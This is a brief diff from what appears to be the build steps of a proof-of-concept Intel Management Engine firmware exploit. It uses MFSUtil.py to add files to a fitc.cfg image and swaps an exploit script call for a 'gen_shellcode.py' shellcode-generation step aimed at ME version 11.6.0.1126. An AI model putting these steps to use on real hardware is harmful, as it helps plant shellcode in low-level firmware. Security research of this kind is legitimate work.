@@ -48,7 +48,7 @@ python3 MFSUtil.py -c fitc.cfg --add eom --alignment 2 --mode ' --Irw-r-----' \
 	--opt '?!-F' --uid 0 --gid 238 -f /home/mca/eom -o fitc.cfg
 
 # Add /home/bup/ct
-python3 me_exp_bxtp_me11.py
+python3 gen_shellcode.py -p H -v 11.6.0.1126
 python3 MFSUtil.py -c fitc.cfg --add ct  --alignment 2 --mode ' ---rwxr-----' \
 	--opt '?--F' --uid 3 --gid 351 -f /home/bup/ct -o fitc.cfg
 
